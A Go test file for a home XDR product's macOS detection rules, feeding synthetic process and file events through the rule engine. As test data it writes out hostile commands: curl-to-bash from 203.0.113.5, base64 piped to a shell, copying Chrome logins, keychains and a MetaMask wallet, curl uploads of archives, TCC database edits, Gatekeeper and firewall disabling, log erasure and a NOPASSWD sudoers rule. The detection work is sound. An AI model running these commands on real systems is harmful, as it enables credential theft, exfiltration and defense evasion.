package detect

import (
	"path/filepath"
	"testing"

	"github.com/Netdoodle/homexdr/shared/event"
)

// The macOS rules against events shaped like the agent's eslogger mapping.
func TestShippedRulesMacOS(t *testing.T) {
	rules, errs := LoadDir(filepath.Join("..", "..", "..", "rules"))
	for _, e := range errs {
		t.Errorf("load %s: %v", e.Path, e.Err)
	}
	e := NewEngine()
	e.SetRules(rules)
	titles := map[string]string{}
	for _, r := range rules {
		titles[r.ID] = r.Title
	}
	mac := &event.OS{Platform: event.PlatformDarwin}
	es := func(cat, typ, action string, data map[string]any) *event.Event {
		return &event.Event{
			Host:  event.Host{OS: mac},
			Event: event.Meta{Kind: event.KindEvent, Category: []string{cat}, Type: []string{typ}, Action: action, Module: event.ModuleESLogger},
			Data:  data,
		}
	}
	proc := func(cmd string) *event.Event {
		ev := es(event.CategoryProcess, event.TypeStart, "exec", nil)
		ev.Process = &event.Process{Executable: "/bin/launchctl", CommandLine: cmd}
		return ev
	}
	onLinux := proc("launchctl bootout system/com.homexdr.agent")
	onLinux.Host.OS = &event.OS{Platform: event.PlatformLinux}
	run := func(exe, cmd string) *event.Event {
		ev := proc(cmd)
		ev.Process.Executable = exe
		return ev
	}
	child := func(parent, exe, cmd string) *event.Event {
		ev := run(exe, cmd)
		ev.Process.Parent = &event.Process{Executable: parent}
		return ev
	}
	write := func(exe, path string) *event.Event {
		ev := es(event.CategoryFile, event.TypeChange, "modified", nil)
		ev.Process = &event.Process{Executable: exe}
		ev.File = &event.File{Path: path}
		return ev
	}
	const (
		pipeShell   = "Download Piped To A Shell On macOS"
		remote      = "Remote Login Or Screen Sharing Turned On From The Command Line"
		rootCert    = "Certificate Trusted As A Root From The Command Line On macOS"
		proxy       = "Web Proxy Set From The Command Line On macOS"
		tccDB       = "Privacy Database Edited Directly On macOS"
		stealFiles  = "Browser Passwords, Cookies, Keychains Or Wallets Copied On macOS"
		upload      = "Archive Uploaded With Curl From A Temporary Folder On macOS"
		loginHook   = "Login Or Logout Hook Set On macOS"
		shellRC     = "Shell Startup File Changed By A Program In A Temporary Or Hidden Folder"
		launchTmp   = "Launch Job Loaded From A Temporary Or Hidden Folder On macOS"
		hiddenExec  = "Program Started From A Hidden File Or Folder On macOS"
		gatekeeper  = "Gatekeeper Or Quarantine Turned Off From The Command Line"
		firewall    = "Application Firewall Turned Off On macOS"
		logsErased  = "System Logs Erased On macOS"
		officeShell = "Office App Started A Shell Or Script On macOS"
		sudoers     = "Sudo Rule Added From The Command Line On macOS"
		word        = "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word"
	)

	cases := []struct {
		name string
		ev   *event.Event
		want string
	}{
		{"xprotect", es(event.CategoryMalware, event.TypeInfo, "malware_detected", map[string]any{"malware_identifier": "OSX.Adload"}), "XProtect Detected Malware On macOS"},
		{"xprotect remediated", es(event.CategoryMalware, event.TypeInfo, "malware_remediated", nil), ""},
		{"launch daemon", es(event.CategoryConfiguration, event.TypeCreation, "launch_item_added", map[string]any{"item_type": "daemon", "managed": false}), "Launch Daemon Or Agent Added On macOS"},
		{"managed launch daemon", es(event.CategoryConfiguration, event.TypeCreation, "launch_item_added", map[string]any{"item_type": "daemon", "managed": true}), ""},
		{"login item", es(event.CategoryConfiguration, event.TypeCreation, "launch_item_added", map[string]any{"item_type": "login_item", "managed": false}), ""},
		{"full disk access", es(event.CategoryConfiguration, event.TypeChange, "tcc_modified", map[string]any{"service": "SystemPolicyAllFiles", "identity": "com.x", "right": "allowed"}), "Sensitive Privacy Permission Granted On macOS"},
		{"full disk access denied", es(event.CategoryConfiguration, event.TypeChange, "tcc_modified", map[string]any{"service": "SystemPolicyAllFiles", "right": "denied"}), ""},
		{"camera", es(event.CategoryConfiguration, event.TypeChange, "tcc_modified", map[string]any{"service": "Camera", "right": "allowed"}), ""},
		{"gatekeeper", es(event.CategoryConfiguration, event.TypeChange, "gatekeeper_override", nil), "Gatekeeper Overridden On macOS"},
		{"admin group", es(event.CategoryIAM, event.TypeChange, "group_member_added", map[string]any{"group": "admin"}), "User Added To The Admin Group On macOS"},
		{"staff group", es(event.CategoryIAM, event.TypeChange, "group_member_added", map[string]any{"group": "staff"}), ""},
		{"bootout agent", proc("launchctl bootout system/com.homexdr.agent"), "HomeXDR Agent Stopped Or Removed On macOS"},
		{"uninstall agent", proc("/usr/local/bin/homexdr-agent uninstall"), "HomeXDR Agent Stopped Or Removed On macOS"},
		{"kickstart agent", proc("launchctl kickstart -k system/com.homexdr.agent"), ""},
		{"agent status", proc("/usr/local/bin/homexdr-agent status"), ""},
		{"linux host", onLinux, ""},

		{"sh -c curl pipe", run("/bin/sh", `sh -c curl -fsSL http://203.0.113.5/i.sh | bash`), pipeShell},
		{"bash -c $(curl)", run("/bin/zsh", `zsh -c bash -c "$(curl -fsSL http://203.0.113.5/i.sh)"`), pipeShell},
		{"base64 to shell", run("/bin/sh", `sh -c echo Y3VybA== | base64 -d | bash`), pipeShell},
		{"osascript do shell script", run("/usr/bin/osascript", `osascript -e do shell script "curl -s http://203.0.113.5/x -o /tmp/x"`), pipeShell},
		{"homebrew install", run("/bin/bash", `bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"`), ""},
		{"curl to file", run("/usr/bin/curl", `curl -fsSL -o out.json https://example.org/a.json`), ""},

		{"remote login on", run("/usr/sbin/systemsetup", "systemsetup -f -setremotelogin on"), remote},
		{"ssh daemon load", run("/bin/launchctl", "launchctl load -w /System/Library/LaunchDaemons/ssh.plist"), remote},
		{"ard kickstart", run("/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart",
			"/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -privs -all"), remote},
		{"remote login off", run("/usr/sbin/systemsetup", "systemsetup -setremotelogin off"), ""},
		{"remote login status", run("/usr/sbin/systemsetup", "systemsetup -getremotelogin"), ""},

		{"add trusted cert", run("/usr/bin/security", "security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/ca.crt"), rootCert},
		{"find cert", run("/usr/bin/security", "security find-certificate -a -p"), ""},

		{"web proxy", run("/usr/sbin/networksetup", "networksetup -setwebproxy Wi-Fi 203.0.113.9 8080"), proxy},
		{"pac proxy", run("/usr/sbin/networksetup", "networksetup -setautoproxyurl Wi-Fi http://203.0.113.9/p.pac"), proxy},
		{"proxy state off", run("/usr/sbin/networksetup", "networksetup -setwebproxystate Wi-Fi off"), ""},
		{"get proxy", run("/usr/sbin/networksetup", "networksetup -getwebproxy Wi-Fi"), ""},

		{"tcc insert", run("/usr/bin/sqlite3", `sqlite3 /Users/alex/Library/Application Support/com.apple.TCC/TCC.db INSERT INTO access VALUES('kTCCServiceScreenCapture','com.x',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,0)`), tccDB},
		{"tcc copy over", run("/bin/cp", "cp /tmp/t.db /Library/Application Support/com.apple.TCC/TCC.db"), tccDB},
		{"tcc select", run("/usr/bin/sqlite3", "sqlite3 /Library/Application Support/com.apple.TCC/TCC.db select client,service from access"), ""},

		{"copy chrome logins", run("/bin/cp", "cp /Users/alex/Library/Application Support/Google/Chrome/Default/Login Data /tmp/a1/chrome"), stealFiles},
		{"zip keychains", run("/usr/bin/ditto", "ditto -c -k --sequesterRsrc /Users/alex/Library/Keychains/ /tmp/k.zip"), stealFiles},
		{"metamask", run("/bin/cp", "cp -R /Users/alex/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn /tmp/w"), stealFiles},
		{"copy documents", run("/bin/cp", "cp /Users/alex/Documents/report.pdf /tmp/"), ""},

		{"curl form upload", run("/usr/bin/curl", `curl -X POST -H "user: x" -F "file=@/tmp/out.zip" http://203.0.113.5/contact`), upload},
		{"curl upload var folders", run("/usr/bin/curl", "curl --data-binary @/private/var/folders/ab/xyz/T/l.zip http://203.0.113.5/u"), upload},
		{"curl json post", run("/usr/bin/curl", `curl -X POST -d {"a":1} https://example.org/api`), ""},

		{"login hook", run("/usr/bin/defaults", "defaults write com.apple.loginwindow LoginHook /Users/Shared/.h.sh"), loginHook},
		{"loginwindow other", run("/usr/bin/defaults", "defaults write com.apple.loginwindow TALLogoutSavesState -bool false"), ""},

		{"rc from tmp", write("/private/tmp/updater", "/Users/alex/.zshrc"), shellRC},
		{"rc from hidden binary", write("/Users/alex/.helper", "/Users/alex/.zprofile"), shellRC},
		{"rc from zsh", write("/bin/zsh", "/Users/alex/.zshrc"), ""},
		{"other file from tmp", write("/private/tmp/updater", "/Users/alex/notes.txt"), ""},

		{"launchctl load tmp", run("/bin/launchctl", "launchctl load /tmp/com.apple.updater.plist"), launchTmp},
		{"launchctl bootstrap hidden", run("/bin/launchctl", "launchctl bootstrap gui/501 /Users/alex/.cfg/com.x.plist"), launchTmp},
		{"launchctl load agents", run("/bin/launchctl", "launchctl load /Users/alex/Library/LaunchAgents/com.x.plist"), ""},

		{"hidden home binary", run("/Users/alex/.helper", "/Users/alex/.helper"), hiddenExec},
		{"hidden shared folder", run("/Users/Shared/.x/agent", "/Users/Shared/.x/agent"), hiddenExec},
		{"cargo binary", run("/Users/alex/.cargo/bin/rg", "rg foo"), ""},
		{"app support binary", run("/Users/alex/Library/Application Support/Code/bin/code", "code"), ""},

		{"spctl disable", run("/usr/sbin/spctl", "spctl --master-disable"), gatekeeper},
		{"quarantine off", run("/usr/bin/defaults", "defaults write com.apple.LaunchServices LSQuarantine -bool NO"), gatekeeper},
		{"spctl status", run("/usr/sbin/spctl", "spctl --status"), ""},

		{"firewall off", run("/usr/libexec/ApplicationFirewall/socketfilterfw", "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off"), firewall},
		{"firewall on", run("/usr/libexec/ApplicationFirewall/socketfilterfw", "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on"), ""},

		{"log erase", run("/usr/bin/log", "log erase --all"), logsErased},
		{"rm audit", run("/bin/rm", "rm -rf /var/audit/"), logsErased},
		{"rm var log", run("/bin/rm", "rm -rf /private/var/log/*"), logsErased},
		{"log show", run("/usr/bin/log", "log show --last 5m"), ""},
		{"rm one old log", run("/bin/rm", "rm /var/log/install.log.0.gz"), ""},

		{"word spawns sh", child(word, "/bin/sh", "sh -c whoami"), officeShell},
		{"word spawns osascript", child(word, "/usr/bin/osascript", "osascript -e display notification"), officeShell},
		{"word spawns updater", child(word, "/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/Microsoft AutoUpdate", "Microsoft AutoUpdate"), ""},

		{"tee sudoers.d", run("/usr/bin/tee", "tee /etc/sudoers.d/x"), sudoers},
		{"sh redirect sudoers", run("/bin/sh", "sh -c echo 'alex ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"), sudoers},
		{"cat sudoers", run("/bin/cat", "cat /etc/sudoers"), ""},
	}
	for _, c := range cases {
		var got []string
		for _, r := range e.Evaluate(c.ev) {
			if t, ok := titles[r.ID]; ok {
				got = append(got, t)
			}
		}
		switch {
		case c.want == "" && len(got) > 0:
			t.Errorf("%s: unexpected hits %v", c.name, got)
		case c.want != "" && (len(got) != 1 || got[0] != c.want):
			t.Errorf("%s: hits %v, want %q", c.name, got, c.want)
		}
	}
}
